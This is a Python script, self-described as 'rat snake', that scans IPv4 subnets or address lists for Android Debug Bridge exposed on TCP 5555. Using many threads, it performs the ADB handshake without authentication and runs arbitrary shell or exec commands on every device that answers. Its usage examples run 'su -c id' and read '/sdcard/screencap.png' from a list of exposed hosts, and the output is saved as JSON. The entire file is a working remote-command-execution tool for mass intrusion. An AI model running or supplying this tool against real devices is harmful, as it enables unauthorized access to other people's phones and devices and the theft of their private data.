#!/usr/bin/python3

import socket
import json
import base64
import getopt
import sys
import time
from datetime import datetime
from adb.adbStructure import adbCommand,adbExtract
from concurrent.futures import ThreadPoolExecutor
from netaddr import IPNetwork,IPAddress 
import logging
import random

def usage():
    print("[*] rat snake")
    print("[*] Usage: %s [ -t [IPV4 Address or Subnet] -l [file with IPv4 addresses]  -p [TCP Port] -c [array of commands, comma separated] -f [save output to file] -e [use exec, instead of shell] -w [workers] " % sys.argv[0])
    print("[*] Example: %s -t 10.0.0.0/24 -w 15 -p 5555 -c 'id,echo $PATH,ss -antp,su -c id' -f out.json " % sys.argv[0])
    print("[*] Example: %s -l ips-with-adb-exposed.txt -w 40 -p 5555 -c 'cat /sdcard/screencap.png' -f out.json -e" % sys.argv[0])
    sys.exit(0)

def read_file(filename):
    try:
        with open(filename, "r") as f:
            targets = list(f)
    except:
        targets = None
    return targets

try:
    opts, args = getopt.getopt(sys.argv[1:],"t:p:c:w:l:f:e",["target","port","command","workers","list","file","exec"])
except getopt.GetoptError as err:
    print(str(err))
    usage()

target = None
workers = None
targetPort = None
command = None
targetList = None
outFile = None
adbExec = None

for o, a in opts:
    if o in ("-t", "--target"):
        target = IPNetwork(a)
    if o in ("-p", "--port"):
        targetPort = int(a)
    if o in ("-w", "--workers"):
        workers = int(a)
    if o in ("-c", "--command"):
        command = a
    if o in ("-l", "--list"):
        if target:
            targetList = True
        target = read_file(a)
    if o in ("-f", "--file"):
        outFile = a
    if o in ("-e", "--exec"):
        adbExec = True

if target and targetList:
    usage()
elif (target and targetPort and command):
    pass
else:
    usage()

def write_file(filename, data):
    with open(filename, "a") as f:
        json.dump(data, f)

def receive_from(connection):

    buffer = b""
    # We set a 2 second timeout; depending on your target, this may need to be adjusted
    connection.settimeout(2)
    try:
        # keep reading into the buffer until there's no more data or we time out
        while True:
            data = connection.recv(4096)
            if data:
                buffer += bytes(data)
            else:
                break
    except:
        pass

    return buffer

def discover_host(target, port=targetPort, cmd=command, logfile=outFile, adb_exec=adbExec):

    data = adbCommand("CNXN", 16777217, 256*4096, "host::features=abb_exec,fixed_push_symlink_timestamp,abb,stat_v2,apex,shell_v2,fixed_push_mkdir,cmd").adbPacket
    commandList = cmd.split(",")
    validConnect = False
    gotClose = False
    lastCommand = b""
    logData = None
    logData = { "ts" : str(datetime.utcnow()), "ip" : str(target), "port" : port }

    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((str(target),port))
        client.send(data)
        recv_buffer = receive_from(client)

        if len(recv_buffer):
            adb_header = adbExtract(recv_buffer).adbMessages
            for messages in adb_header:
                if messages["command"] == b"CNXN":
                    logData["device_header"] = base64.b64encode(messages["payload"]).decode('utf-8')
                    validConnect = True
                    
        if validConnect:

            logData["cmds"] = []

            for command in commandList:
                # open a connection to execute a command
                gotOkay = False
                result = b""
                closeCounter = 0
                recv_buffer = b""
                lastCommand = b""
                while gotOkay == False and closeCounter < 5:
                    localId = random.randint(1,4294967295)
                    if adb_exec:
                        payload = "exec:" + command + "\x00"
                    else:
                        payload = "shell:" + command + "\x00"
                    data = adbCommand("OPEN", localId, 0, payload).adbPacket
                    client.send(data)
                    recv_buffer = receive_from(client)

                    if len(recv_buffer):
                        adb_header = adbExtract(recv_buffer).adbMessages
                        for messages in adb_header:
                            if messages["command"] == b"OKAY":
                                gotOkay = True
                                remoteId = int.from_bytes(messages["arg0"], 'little')
                            if messages["command"] == b"WRTE" and gotOkay:
                                result += messages["payload"]
                            lastCommand = messages["command"]

                    closeCounter += 1

                if (lastCommand == b"WRTE" and gotOkay) or lastCommand == b"CLSE":
                    # send okays until we get a close
                    while True:
                        if lastCommand == b"CLSE":
                            break
                        else:
                            data = adbCommand("OKAY", localId, remoteId, "").adbPacket
                            client.send(data)
                            recv_buffer = receive_from(client)
                            if len(recv_buffer):
                                adb_header = adbExtract(recv_buffer).adbMessages
                                for messages in adb_header:
                                    if messages["command"] == b"WRTE":
                                        result += messages["payload"]
                                lastCommand = messages["command"]
                            else:
                                break

                    logData["cmds"].append({"cmd" : command, "data" : base64.b64encode(result).decode('utf-8')})

    except:
        pass

    return logData
    
with ThreadPoolExecutor(max_workers=workers) as executor:
    results = executor.map(discover_host,target)

if outFile:
    write_file(outFile,list(results))
